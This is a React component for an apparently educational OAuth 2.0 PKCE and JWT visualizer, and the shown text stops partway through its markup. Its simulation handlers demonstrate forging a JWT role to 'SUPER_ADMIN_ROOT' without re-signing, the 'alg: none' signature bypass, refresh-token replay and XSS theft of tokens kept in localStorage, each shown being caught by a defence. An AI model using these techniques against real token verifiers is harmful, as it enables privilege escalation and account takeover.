import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Shield,
  Key,
  Lock,
  Unlock,
  CheckCircle2,
  AlertTriangle,
  Play,
  Pause,
  RotateCcw,
  ChevronRight,
  ChevronLeft,
  Copy,
  Check,
  Zap,
  Globe,
  Server,
  Smartphone,
  Database,
  ArrowRight,
  Eye,
  RefreshCw,
  Code2,
  Terminal,
  Layers,
  FileCheck,
  Cpu,
  Sparkles,
  ShieldAlert,
} from 'lucide-react';
import { sound } from '../../utils/soundEffects';

// --- CRYPTOGRAPHIC UTILITIES (RFC 7519 & Web Crypto API) ---

export function bufferToBase64Url(buffer: ArrayBuffer | Uint8Array): string {
  const bytes = buffer instanceof Uint8Array ? buffer : new Uint8Array(buffer);
  let binary = '';
  for (let i = 0; i < bytes.byteLength; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary)
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

export function stringToBase64Url(str: string): string {
  const enc = new TextEncoder();
  return bufferToBase64Url(enc.encode(str));
}

export function base64UrlToString(b64: string): string {
  let standard = b64.replace(/-/g, '+').replace(/_/g, '/');
  while (standard.length % 4 !== 0) standard += '=';
  try {
    return atob(standard);
  } catch {
    return '';
  }
}

export async function computeHmacSha256(data: string, secret: string): Promise<string> {
  try {
    const enc = new TextEncoder();
    const keyData = enc.encode(secret);
    const key = await window.crypto.subtle.importKey(
      'raw',
      keyData,
      { name: 'HMAC', hash: 'SHA-256' },
      false,
      ['sign']
    );
    const signature = await window.crypto.subtle.sign('HMAC', key, enc.encode(data));
    return bufferToBase64Url(signature);
  } catch (err) {
    return 'sig-error';
  }
}

// --- FLOW STEP DEFINITION ---
interface FlowStep {
  step: number;
  title: string;
  source: 'user' | 'client' | 'authServer' | 'resourceServer';
  target: 'user' | 'client' | 'authServer' | 'resourceServer';
  method: 'USER ACTION' | 'GET' | 'POST' | 'REDIRECT' | 'TOKEN EXCHANGE';
  endpoint: string;
  packetLabel: string;
  summary: string;
  securityInvariant: string;
  params: Record<string, string>;
  responsePayload?: Record<string, any>;
}

const OAUTH_PKCE_STEPS: FlowStep[] = [
  {
    step: 1,
    title: 'Client Generates PKCE Code Verifier & Challenge',
    source: 'client',
    target: 'client',
    method: 'USER ACTION',
    endpoint: 'Client-Side In-Memory Cryptography',
    packetLabel: 'code_challenge = SHA256(verifier)',
    summary:
      'The client app (Single Page App / Mobile) creates a high-entropy cryptographic random string (code_verifier). It then hashes it with SHA-256 and base64url-encodes it into code_challenge.',
    securityInvariant:
      'PKCE (Proof Key for Code Exchange) protects public clients without client secrets against malicious authorization code interception attacks.',
    params: {
      code_verifier: 'dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk (kept in secret memory)',
      code_challenge: 'E9Melhoa2OwvFrGMTJguCH5rtx642N-wpAhSTSfEsPE',
      code_challenge_method: 'S256',
    },
  },
  {
    step: 2,
    title: 'Redirect User to Authorization Server (/authorize)',
    source: 'client',
    target: 'authServer',
    method: 'REDIRECT',
    endpoint: 'https://auth.company.com/oauth/v2/authorize',
    packetLabel: 'GET /authorize?client_id=...&code_challenge=...',
    summary:
      'The client redirects the user browser to the Auth Server login screen, transmitting the code_challenge, scope, and an anti-CSRF state token.',
    securityInvariant:
      'The client NEVER sends the plain code_verifier over the browser redirect—only the one-way hashed code_challenge is visible in query params.',
    params: {
      response_type: 'code',
      client_id: 'ada-algorithm-hub-client',
      redirect_uri: 'https://app.company.com/callback',
      scope: 'openid profile email offline_access',
      state: 'xyz_random_csrf_token_891',
      code_challenge: 'E9Melhoa2OwvFrGMTJguCH5rtx642N-wpAhSTSfEsPE',
      code_challenge_method: 'S256',
    },
  },
  {
    step: 3,
    title: 'User Authenticates & Grants Scope Consent',
    source: 'user',
    target: 'authServer',
    method: 'POST',
    endpoint: 'https://auth.company.com/login & /consent',
    packetLabel: 'Credentials + MFA + Consent Form',
    summary:
      'The user enters their credentials (username/password or Passkey/MFA) directly on the trusted Auth Server. The client application NEVER sees user passwords.',
    securityInvariant:
      'Credential isolation: Third-party apps never touch or store raw user passwords. Only the dedicated Identity Provider (IdP) handles login.',
    params: {
      user_identity: 'ada.lovelace@cyber.org',
      mfa_status: 'WebAuthn_Passkey_Verified',
      granted_scopes: 'openid, profile, email',
    },
  },
  {
    step: 4,
    title: 'Auth Server Redirects with Authorization Code',
    source: 'authServer',
    target: 'client',
    method: 'REDIRECT',
    endpoint: 'https://app.company.com/callback?code=splat-code-991&state=...',
    packetLabel: '302 Redirect with ?code=splat-auth-code',
    summary:
      'Auth Server redirects back to the registered redirect_uri with a temporary, single-use authorization code and echoes back the state parameter.',
    securityInvariant:
      'State parameter verification prevents CSRF login attacks. The code is only valid for 60 seconds and can only be used once.',
    params: {
      code: 'splat_auth_code_78bf190e44',
      state: 'xyz_random_csrf_token_891 (client verifies match)',
    },
  },
  {
    step: 5,
    title: 'Client Exchanges Code + Plain Verifier (/oauth/token)',
    source: 'client',
    target: 'authServer',
    method: 'POST',
    endpoint: 'https://auth.company.com/oauth/v2/token',
    packetLabel: 'POST /token {code, code_verifier}',
    summary:
      'The client issues a direct back-channel HTTP POST to the token endpoint, passing the authorization code along with the original plain code_verifier.',
    securityInvariant:
      'Even if an attacker intercepted the authorization code in Step 4, they cannot exchange it because they do NOT possess the unhashed code_verifier!',
    params: {
      grant_type: 'authorization_code',
      client_id: 'ada-algorithm-hub-client',
      code: 'splat_auth_code_78bf190e44',
      code_verifier: 'dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk',
      redirect_uri: 'https://app.company.com/callback',
    },
  },
  {
    step: 6,
    title: 'Auth Server Verifies PKCE & Issues JWT Tokens',
    source: 'authServer',
    target: 'client',
    method: 'TOKEN EXCHANGE',
    endpoint: 'Token Response Body (JSON)',
    packetLabel: '200 OK: {access_token, id_token, refresh_token}',
    summary:
      'The Auth Server hashes the incoming code_verifier with SHA-256 and compares it with the code_challenge stored in Step 2. If they match, it mints and signs the JWTs.',
    securityInvariant:
      'Cryptographic proof: BASE64URL(SHA256(verifier)) == challenge proves the same client that initiated Step 2 is completing Step 5.',
    params: {
      token_type: 'Bearer',
      expires_in: '900 (15 minutes)',
    },
    responsePayload: {
      access_token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
      id_token: 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjIwMjYtMSJ9...',
      refresh_token: 'rfr_99a8b1c2d3e4f5a6b7c8',
      expires_in: 900,
    },
  },
  {
    step: 7,
    title: 'Client Calls Protected API with Bearer Token',
    source: 'client',
    target: 'resourceServer',
    method: 'GET',
    endpoint: 'https://api.company.com/v1/user/profile',
    packetLabel: 'GET /profile (Authorization: Bearer <jwt>)',
    summary:
      'Client invokes protected API routes attaching the access token in the standard HTTP Authorization header.',
    securityInvariant:
      'Stateless request authorization: The Resource Server does not need to query the database to know who the user is—the JWT is self-contained.',
    params: {
      Authorization: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxM...',
      'Content-Type': 'application/json',
    },
  },
  {
    step: 8,
    title: 'Resource Server Verifies JWT Signature & Returns Data',
    source: 'resourceServer',
    target: 'client',
    method: 'GET',
    endpoint: 'Protected Data Stream',
    packetLabel: '200 OK: { user_data, permissions }',
    summary:
      'The Resource Server validates the signature using the shared secret or public key (JWKS), ensures exp > now(), and serves the data.',
    securityInvariant:
      'Tamper-proof assurance: Any alteration to user_id or role in the JWT payload invalidates the signature mathematically, triggering 401 Unauthorized.',
    params: {
      signature_verification: 'HMAC_SHA256 / RS256 Validated',
      claims_checked: 'exp, nbf, iss, aud, sub',
    },
    responsePayload: {
      id: 'usr_8921',
      name: 'Ada Lovelace',
      email: 'ada@cyber.org',
      role: 'Staff Architect',
      permissions: ['read:algorithms', 'write:benchmarks'],
    },
  },
];

export const OAuthJwtVisualizer: React.FC = () => {
  const [activeTab, setActiveTab] = useState<
    'flow' | 'jwtStudio' | 'lifecycle' | 'storage' | 'code'
  >('flow');

  // --- FLOW STEPPER STATE ---
  const [currentStepIdx, setCurrentStepIdx] = useState<number>(0);
  const [isPlaying, setIsPlaying] = useState<boolean>(false);
  const [playbackSpeed, setPlaybackSpeed] = useState<number>(2500);

  // --- LIVE JWT STUDIO STATE ---
  const [jwtHeaderJson, setJwtHeaderJson] = useState<string>(
    JSON.stringify({ alg: 'HS256', typ: 'JWT' }, null, 2)
  );
  const [jwtPayloadJson, setJwtPayloadJson] = useState<string>(
    JSON.stringify(
      {
        sub: 'usr_94812_ada',
        name: 'Ada Lovelace',
        role: 'user',
        iat: 1773812000,
        exp: 1773812900,
        iss: 'https://auth.algorithm-adventures.com',
      },
      null,
      2
    )
  );
  const [secretKey, setSecretKey] = useState<string>('super-secret-vault-key-2026');
  const [calculatedSig, setCalculatedSig] = useState<string>('');
  const [tamperedSig, setTamperedSig] = useState<string | null>(null);
  const [copiedToken, setCopiedToken] = useState<boolean>(false);

  // --- TOKEN LIFECYCLE STATE ---
  const [accessTokenTtl, setAccessTokenTtl] = useState<number>(15); // in minutes
  const [isTokenExpired, setIsTokenExpired] = useState<boolean>(false);
  const [refreshTokenRotated, setRefreshTokenRotated] = useState<boolean>(false);
  const [replayAttackDetected, setReplayAttackDetected] = useState<boolean>(false);
  const [lifecycleLog, setLifecycleLog] = useState<string[]>([]);

  // --- XSS & CSRF SIMULATION STATE ---
  const [storageMethod, setStorageMethod] = useState<'localStorage' | 'httpOnlyCookie'>('httpOnlyCookie');
  const [xssAttempted, setXssAttempted] = useState<boolean>(false);
  const [xssResult, setXssResult] = useState<string | null>(null);

  // Code Tab Language State
  const [codeSnippetLang, setCodeSnippetLang] = useState<'typescript' | 'python' | 'nextjs'>('typescript');

  // Calculate real HMAC-SHA256 signature when header, payload, or secret changes
  useEffect(() => {
    let isCancelled = false;
    const updateSignature = async () => {
      try {
        const headerB64 = stringToBase64Url(jwtHeaderJson);
        const payloadB64 = stringToBase64Url(jwtPayloadJson);
        const dataToSign = `${headerB64}.${payloadB64}`;
        const sig = await computeHmacSha256(dataToSign, secretKey);
        if (!isCancelled) {
          setCalculatedSig(sig);
        }
      } catch (err) {
        if (!isCancelled) setCalculatedSig('error-sig');
      }
    };
    updateSignature();
    return () => {
      isCancelled = true;
    };
  }, [jwtHeaderJson, jwtPayloadJson, secretKey]);

  // Flow Auto-play timer
  useEffect(() => {
    if (!isPlaying) return;
    const interval = setInterval(() => {
      setCurrentStepIdx((prev) => {
        if (prev >= OAUTH_PKCE_STEPS.length - 1) {
          setIsPlaying(false);
          return prev;
        }
        return prev + 1;
      });
    }, playbackSpeed);
    return () => clearInterval(interval);
  }, [isPlaying, playbackSpeed]);

  const activeStep = OAUTH_PKCE_STEPS[currentStepIdx];

  // Live Token Construction
  const fullJwtToken = React.useMemo(() => {
    const hB64 = stringToBase64Url(jwtHeaderJson);
    const pB64 = stringToBase64Url(jwtPayloadJson);
    const sig = tamperedSig !== null ? tamperedSig : calculatedSig;
    return `${hB64}.${pB64}.${sig}`;
  }, [jwtHeaderJson, jwtPayloadJson, calculatedSig, tamperedSig]);

  const isSignatureValid = tamperedSig === null;

  // Handle Token Tamper simulation
  const handleTamperPayload = () => {
    sound.playError();
    // Tamper the payload: change role to admin, but DO NOT recalculate signature with secret
    try {
      const parsed = JSON.parse(jwtPayloadJson);
      parsed.role = 'SUPER_ADMIN_ROOT';
      parsed.privileges = ['database:drop', 'users:delete', 'system:root'];
      setJwtPayloadJson(JSON.stringify(parsed, null, 2));
      // Set the signature to the old signature, causing an intentional verification mismatch!
      setTamperedSig(calculatedSig);
    } catch {
      // fallback
    }
  };

  const handleFixSignature = async () => {
    sound.playCelebration();
    setTamperedSig(null);
  };

  // Simulate Alg: None attack
  const handleSimulateAlgNone = () => {
    sound.playError();
    setJwtHeaderJson(JSON.stringify({ alg: 'none', typ: 'JWT' }, null, 2));
    setTamperedSig('');
  };

  // Lifecycle simulator handlers
  const handleApiCallWithAccessToken = () => {
    sound.playPop();
    if (isTokenExpired) {
      setLifecycleLog((prev) => [
        `❌ HTTP 401 Unauthorized: Access token expired (${accessTokenTtl}m limit exceeded). Silent refresh required.`,
        ...prev.slice(0, 9),
      ]);
    } else {
      setLifecycleLog((prev) => [
        `✅ HTTP 200 OK: API call succeeded with Bearer token! User verified.`,
        ...prev.slice(0, 9),
      ]);
    }
  };

  const handleSimulateExpiration = () => {
    sound.playTimerTick();
    setIsTokenExpired(true);
    setLifecycleLog((prev) => [
      `⏰ Clock tick: 15 minutes elapsed! Access Token expired. Resource Server will now reject with 401.`,
      ...prev.slice(0, 9),
    ]);
  };

  const handlePerformSilentRefresh = () => {
    sound.playCelebration();
    setIsTokenExpired(false);
    setRefreshTokenRotated(true);
    setReplayAttackDetected(false);
    setLifecycleLog((prev) => [
      `🔄 Silent Refresh Handshake: Client sent Refresh Token (rfr_v1). Auth server verified, invalidated rfr_v1, and issued new pair: Access Token (15m) + new Refresh Token (rfr_v2).`,
      ...prev.slice(0, 9),
    ]);
  };

  const handleSimulateReplayAttack = () => {
    sound.playError();
    setReplayAttackDetected(true);
    setIsTokenExpired(true);
    setLifecycleLog((prev) => [
      `🚨 SECURITY BREACH DETECTED: Attacker attempted to reuse already-invalidated refresh token (rfr_v1)!`,
      `🛡️ REFRESH TOKEN ROTATION DEFENSE TRIGGERED: Auth server invalidated entire token family (rfr_v1, rfr_v2). All sessions immediately revoked. User forced to re-authenticate!`,
      ...prev.slice(0, 9),
    ]);
  };

  // XSS Attack Simulator
  const handleSimulateXssAttack = () => {
    setXssAttempted(true);
    if (storageMethod === 'localStorage') {
      sound.playError();
      setXssResult(
        '🚨 DISASTER! Malicious JavaScript (document.cookie / localStorage) read your access token! Attacker exfiltrated: eyJhbGciOiJIUzI1Ni...'
      );
    } else {
      sound.playCelebration();
      setXssResult(
        '🛡️ ATTACK DEFLECTED! The attacker executed document.cookie, but your auth token was sealed with HttpOnly flag! JavaScript has zero access. Token safe!'
      );
    }
  };

  return (
    <div className="bg-[#0b0e1b] border-2 border-[#1e253e] rounded-3xl p-4 sm:p-7 shadow-2xl space-y-6 text-slate-200 animate-in fade-in duration-300">
      {/* 1. Header Banner */}
      <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4 p-5 rounded-2xl bg-gradient-to-r from-purple-950/60 via-[#121730] to-indigo-950/60 border border-purple-500/30">
        <div className="space-y-1.5">
          <div className="flex flex-wrap items-center gap-2">
            <span className="px-3 py-1 rounded-full bg-purple-500/20 text-purple-300 font-mono text-xs font-bold border border-purple-500/40 flex items-center gap-1.5 shadow-sm">
              <Shield className="w-3.5 h-3.5 text-purple-400" />
              RFC 6749 • RFC 7636 • RFC 7519
            </span>
            <span className="text-xs text-amber-300 font-mono font-bold">
              Production Cryptography &amp; Identity Architecture
            </span>
          </div>

          <h2 className="text-2xl sm:text-3xl font-bangers text-white tracking-wide flex items-center gap-2.5">
            <span>OAUTH 2.0 PKCE &amp; JWT CRYPTOGRAPHIC STUDIO</span>
            <span className="text-sm font-sans px-2.5 py-0.5 rounded-lg bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
              Interactive
            </span>
          </h2>

          <p className="text-xs sm:text-sm text-slate-300 max-w-3xl leading-relaxed">
            Deconstruct the end-to-end OAuth 2.0 Authorization Code Flow with PKCE, inspect live HMAC-SHA256 JWT signatures in real-time, test token rotation defenses, and simulate XSS vs CSRF storage security attacks.
          </p>
        </div>

        {/* Quick Nav Pills */}
        <div className="flex flex-wrap lg:flex-nowrap gap-1.5 bg-[#080b16] p-1.5 rounded-xl border border-white/10 shrink-0">
          {[
            { id: 'flow', label: '1. PKCE Sequence Flow', icon: ArrowRight },
            { id: 'jwtStudio', label: '2. Live JWT Studio', icon: Key },
            { id: 'lifecycle', label: '3. Token Rotation', icon: RefreshCw },
            { id: 'storage', label: '4. Storage Threat Matrix', icon: ShieldAlert },
            { id: 'code', label: '5. Production Code', icon: Code2 },
          ].map((t) => {
            const Icon = t.icon;
            const active = activeTab === t.id;
            return (
              <button
                key={t.id}
                onClick={() => {
                  sound.playPop();
                  setActiveTab(t.id as any);
                }}
                className={`px-3 py-2 rounded-lg text-xs font-bold transition flex items-center gap-1.5 cursor-pointer ${
                  active
                    ? 'bg-purple-600 text-white shadow-lg shadow-purple-600/30'
                    : 'text-slate-400 hover:text-white hover:bg-white/[0.05]'
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{t.label}</span>
              </button>
            );
          })}
        </div>
      </div>

      {/* ========================================================================= */}
      {/* TAB 1: OAUTH 2.0 + PKCE SEQUENCE DIAGRAM & PLAYBACK                       */}
      {/* ========================================================================= */}
      {activeTab === 'flow' && (
        <div className="space-y-6">
          {/* Controls Bar */}
          <div className="flex flex-wrap items-center justify-between gap-3 p-4 rounded-2xl bg-[#0e1326] border border-white/10">
            <div className="flex items-center gap-2">
              <button
                onClick={() => {
                  sound.playPop();
                  setCurrentStepIdx((prev) => Math.max(0, prev - 1));
                }}
                disabled={currentStepIdx === 0}
                className="p-2 rounded-xl bg-white/[0.06] hover:bg-white/[0.12] disabled:opacity-40 text-white border border-white/10 transition cursor-pointer"
                title="Previous Step"
              >
                <ChevronLeft className="w-4 h-4" />
              </button>

              <button
                onClick={() => {
                  sound.playPop();
                  setIsPlaying((prev) => !prev);
                }}
                className={`px-4 py-2 rounded-xl font-bold text-xs flex items-center gap-1.5 transition cursor-pointer ${
                  isPlaying
                    ? 'bg-amber-400 text-slate-950 shadow-md'
                    : 'bg-purple-600 hover:bg-purple-500 text-white shadow-md'
                }`}
              >
                {isPlaying ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
                <span>{isPlaying ? 'Pause Auto-Play' : 'Auto-Play Flow'}</span>
              </button>

              <button
                onClick={() => {
                  sound.playPop();
                  setCurrentStepIdx((prev) => Math.min(OAUTH_PKCE_STEPS.length - 1, prev + 1));
                }}
                disabled={currentStepIdx === OAUTH_PKCE_STEPS.length - 1}
                className="p-2 rounded-xl bg-white/[0.06] hover:bg-white/[0.12] disabled:opacity-40 text-white border border-white/10 transition cursor-pointer"
                title="Next Step"
              >
                <ChevronRight className="w-4 h-4" />
              </button>

              <button
                onClick={() => {
                  sound.playPop();
                  setCurrentStepIdx(0);
                  setIsPlaying(false);
                }}
                className="p-2 rounded-xl bg-white/[0.06] hover:bg-white/[0.12] text-slate-300 border border-white/10 transition cursor-pointer"
                title="Reset to Step 1"
              >
                <RotateCcw className="w-4 h-4" />
              </button>
            </div>

            {/* Stepper Dots */}
            <div className="flex items-center gap-1.5">
              {OAUTH_PKCE_STEPS.map((s, idx) => (
                <button
                  key={s.step}
                  onClick={() => {
                    sound.playPop();
                    setCurrentStepIdx(idx);
                  }}
                  className={`px-2.5 py-1 rounded-lg text-xs font-mono font-bold transition cursor-pointer ${
                    currentStepIdx === idx
                      ? 'bg-purple-500 text-white border border-purple-400'
                      : idx < currentStepIdx
                      ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
                      : 'bg-white/[0.05] text-slate-400 border border-white/5 hover:text-white'
                  }`}
                >
                  Step {s.step}
                </button>
              ))}
            </div>
          </div>

          {/* Swimlane Actors Grid */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-center">
            {[
              { id: 'user', label: '1. User Browser', sub: 'Resource Owner', icon: Smartphone, color: 'text-amber-400', bg: 'bg-amber-400/10', border: 'border-amber-400/30' },
              { id: 'client', label: '2. Client App', sub: 'SPA / React / Native', icon: Globe, color: 'text-cyan-400', bg: 'bg-cyan-400/10', border: 'border-cyan-400/30' },
              { id: 'authServer', label: '3. Auth Server (IdP)', sub: 'Auth0 / Okta / Keycloak', icon: Shield, color: 'text-purple-400', bg: 'bg-purple-400/10', border: 'border-purple-400/30' },
              { id: 'resourceServer', label: '4. Resource Server', sub: 'Protected Backend API', icon: Server, color: 'text-emerald-400', bg: 'bg-emerald-400/10', border: 'border-emerald-400/30' },
            ].map((actor) => {
              const Icon = actor.icon;
              const isSource = activeStep.source === actor.id;
              const isTarget = activeStep.target === actor.id;
              const isParticipant = isSource || isTarget;

              return (
                <motion.div
                  key={actor.id}
                  animate={{
                    scale: isParticipant ? 1.03 : 1,
                    borderColor: isParticipant ? 'rgba(168, 85, 247, 0.8)' : 'rgba(255, 255, 255, 0.1)',
                  }}
                  className={`p-4 rounded-2xl border ${actor.border} ${actor.bg} relative overflow-hidden transition-all shadow-md`}
                >
                  {isParticipant && (
                    <span className="absolute top-2 right-2 flex h-2 w-2">
                      <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-purple-400 opacity-75"></span>
                      <span className="relative inline-flex rounded-full h-2 w-2 bg-purple-500"></span>
                    </span>
                  )}
                  <Icon className={`w-6 h-6 mx-auto mb-2 ${actor.color}`} />
                  <div className="font-bold text-sm text-white">{actor.label}</div>
                  <div className="text-[11px] font-mono text-slate-400">{actor.sub}</div>
                  {isSource && (
                    <span className="mt-2 inline-block px-2 py-0.5 rounded-full bg-cyan-400/20 text-cyan-300 font-mono text-[10px] font-bold">
                      Source Node
                    </span>
                  )}
                  {isTarget && !isSource && (
                    <span className="mt-2 inline-block px-2 py-0.5 rounded-full bg-purple-400/20 text-purple-300 font-mono text-[10px] font-bold">
                      Target Destination
                    </span>
                  )}
                </motion.div>
              );
            })}
          </div>

          {/* Animated Packet Stream Visualizer */}
          <div className="relative p-6 rounded-3xl bg-[#090c1a] border border-white/10 overflow-hidden space-y-4">
            <div className="flex items-center justify-between border-b border-white/10 pb-3">
              <div className="flex items-center gap-2">
                <span className="px-2.5 py-1 rounded-md bg-purple-500/20 text-purple-300 font-mono text-xs font-bold border border-purple-500/40">
                  Step {activeStep.step} of {OAUTH_PKCE_STEPS.length}
                </span>
                <span className="text-sm font-bold text-white">{activeStep.title}</span>
              </div>

              <div className="flex items-center gap-2">
                <span className="px-2 py-0.5 rounded bg-white/[0.06] font-mono text-[11px] text-amber-300 font-bold border border-white/10">
                  {activeStep.method}
                </span>
                <span className="text-xs font-mono text-slate-400 truncate max-w-xs">
                  {activeStep.endpoint}
                </span>
              </div>
            </div>

            {/* Graphic Animated Wire Diagram */}
            <div className="py-4">
              <div className="relative h-12 bg-[#060914] rounded-xl border border-dashed border-slate-700 flex items-center px-6">
                <div className="text-xs font-mono text-slate-400 font-semibold flex items-center gap-2">
                  <span className="capitalize text-cyan-300">{activeStep.source}</span>
                  <ArrowRight className="w-3.5 h-3.5 text-purple-400" />
                  <span className="capitalize text-purple-300">{activeStep.target}</span>
                </div>

                {/* Animated Flying Packet */}
                <motion.div
                  key={activeStep.step}
                  initial={{ left: '15%', opacity: 0 }}
                  animate={{ left: '75%', opacity: 1 }}
                  transition={{ duration: 1.2, repeat: Infinity, ease: 'easeInOut' }}
                  className="absolute top-1/2 -translate-y-1/2 px-3 py-1 rounded-full bg-gradient-to-r from-purple-500 to-indigo-500 text-white font-mono text-[10px] font-bold shadow-lg shadow-purple-500/50 flex items-center gap-1.5"
                >
                  <Lock className="w-3 h-3 text-white" />
                  <span>{activeStep.packetLabel}</span>
                </motion.div>
              </div>
            </div>

            {/* Explanation & Security Invariant Cards */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Card 1: What happens */}
              <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10 space-y-2">
                <div className="text-xs font-mono uppercase text-cyan-400 font-bold flex items-center gap-1.5">
                  <FileCheck className="w-3.5 h-3.5" />
                  <span>Step Protocol Action</span>
                </div>
                <p className="text-xs text-slate-300 leading-relaxed">{activeStep.summary}</p>
                <div className="p-3 rounded-xl bg-black/40 font-mono text-[11px] text-slate-300 border border-white/5 space-y-1 max-h-40 overflow-y-auto custom-scrollbar">
                  {Object.entries(activeStep.params).map(([k, v]) => (
                    <div key={k} className="flex gap-2">
                      <span className="text-purple-400 shrink-0">{k}:</span>
                      <span className="text-amber-200 truncate">{v}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Card 2: Security Invariant / Attack Prevention */}
              <div className="p-4 rounded-2xl bg-purple-950/20 border border-purple-500/30 space-y-2">
                <div className="text-xs font-mono uppercase text-amber-300 font-bold flex items-center gap-1.5">
                  <ShieldAlert className="w-3.5 h-3.5 text-amber-400" />
                  <span>Security Guarantee &amp; Threat Defense</span>
                </div>
                <p className="text-xs text-purple-200 leading-relaxed font-sans">
                  {activeStep.securityInvariant}
                </p>
                {activeStep.responsePayload && (
                  <div className="p-3 rounded-xl bg-black/60 font-mono text-[11px] text-emerald-300 border border-emerald-500/20">
                    <div className="text-[10px] uppercase text-emerald-400 font-bold mb-1">
                      Payload Returned:
                    </div>
                    <pre className="text-[10px] overflow-x-auto text-emerald-200">
                      {JSON.stringify(activeStep.responsePayload, null, 2)}
                    </pre>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* TAB 2: LIVE CRYPTOGRAPHIC JWT STUDIO & TAMPER SIMULATOR                   */}
      {/* ========================================================================= */}
      {activeTab === 'jwtStudio' && (
        <div className="space-y-6">
          {/* JWT Format Color-Coded Bar */}
          <div className="p-4 rounded-2xl bg-[#080b18] border border-white/10 space-y-2">
            <div className="flex items-center justify-between text-xs font-mono">
              <span className="text-slate-400 font-bold">Live Encoded JSON Web Token (RFC 7519)</span>
              <div className="flex items-center gap-3">
                <span className="flex items-center gap-1 text-red-400 font-bold">
                  <span className="w-2 h-2 rounded-full bg-red-400" /> Header
                </span>
                <span className="flex items-center gap-1 text-purple-400 font-bold">
                  <span className="w-2 h-2 rounded-full bg-purple-400" /> Payload
                </span>
                <span className="flex items-center gap-1 text-cyan-400 font-bold">
                  <span className="w-2 h-2 rounded-full bg-cyan-400" /> Signature
                </span>
              </div>
            </div>

            {/* Live Token String with break-all */}
            <div className="p-3.5 rounded-xl bg-black/60 border border-white/10 font-mono text-xs break-all leading-relaxed select-all">
              <span className="text-red-400 font-bold">{stringToBase64Url(jwtHeaderJson)}</span>
              <span className="text-slate-500 font-bold">.</span>
              <span className="text-purple-400 font-bold">{stringToBase64Url(jwtPayloadJson)}</span>
              <span className="text-slate-500 font-bold">.</span>
              <span className="text-cyan-400 font-bold">
                {tamperedSig !== null ? tamperedSig : calculatedSig}
              </span>
            </div>

            {/* Verification Status Banner */}
            <div className="flex flex-wrap items-center justify-between gap-3 pt-2">
              <div className="flex items-center gap-2">
                {isSignatureValid ? (
                  <div className="px-3 py-1.5 rounded-xl bg-emerald-500/20 text-emerald-300 font-mono text-xs font-bold border border-emerald-500/40 flex items-center gap-1.5">
                    <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                    <span>SIGNATURE VERIFIED: Token authentic &amp; untampered</span>
                  </div>
                ) : (
                  <div className="px-3 py-1.5 rounded-xl bg-red-500/20 text-red-300 font-mono text-xs font-bold border border-red-500/40 flex items-center gap-1.5 animate-pulse">
                    <AlertTriangle className="w-4 h-4 text-red-400" />
                    <span>SIGNATURE MISMATCH: Cryptographic tampering detected! Server will return 401.</span>
                  </div>
                )}
              </div>

              <div className="flex items-center gap-2">
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(fullJwtToken);
                    setCopiedToken(true);
                    sound.playPop();
                    setTimeout(() => setCopiedToken(false), 2000);
                  }}
                  className="px-3 py-1.5 rounded-xl bg-white/[0.06] hover:bg-white/[0.12] text-xs font-mono font-bold text-white border border-white/10 transition cursor-pointer flex items-center gap-1.5"
                >
                  {copiedToken ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copiedToken ? 'Copied Token' : 'Copy Full JWT'}</span>
                </button>
              </div>
            </div>
          </div>

          {/* Attack Simulator Action Buttons */}
          <div className="p-4 rounded-2xl bg-gradient-to-r from-red-950/30 via-[#11162a] to-purple-950/30 border border-white/10 space-y-3">
            <div className="text-xs font-mono text-amber-300 font-bold uppercase flex items-center gap-1.5">
              <Zap className="w-3.5 h-3.5" />
              <span>Interactive Exploit Simulators</span>
            </div>

            <div className="flex flex-wrap gap-2.5">
              <button
                onClick={handleTamperPayload}
                className="px-3.5 py-2 rounded-xl bg-red-950/70 hover:bg-red-900 text-red-200 border border-red-500/40 font-mono text-xs font-bold transition cursor-pointer flex items-center gap-2"
              >
                <AlertTriangle className="w-3.5 h-3.5 text-red-400" />
                <span>Simulate Privilege Escalation Attack (role: SUPER_ADMIN)</span>
              </button>

              <button
                onClick={handleSimulateAlgNone}
                className="px-3.5 py-2 rounded-xl bg-amber-950/70 hover:bg-amber-900 text-amber-200 border border-amber-500/40 font-mono text-xs font-bold transition cursor-pointer flex items-center gap-2"
              >
                <Unlock className="w-3.5 h-3.5 text-amber-400" />
                <span>Simulate "alg: none" Vulnerability (CVE-2015-9235)</span>
              </button>

              <button
                onClick={handleFixSignature}
                className="px-3.5 py-2 rounded-xl bg-emerald-950/70 hover:bg-emerald-900 text-emerald-200 border border-emerald-500/40 font-mono text-xs font-bold transition cursor-pointer flex items-center gap-2 ml-auto"
              >
                <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                <span>Recalculate Valid Signature with Secret Key</span>
              </button>
            </div>
          </div>

          {/* Tri-Pane JSON Editor */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
            {/* 1. Header (Red) */}
            <div className="p-4 rounded-2xl bg-[#090d1c] border border-red-500/30 space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono font-bold text-red-400 flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-red-400" />
                  1. HEADER (Algorithm &amp; Token Type)
                </span>
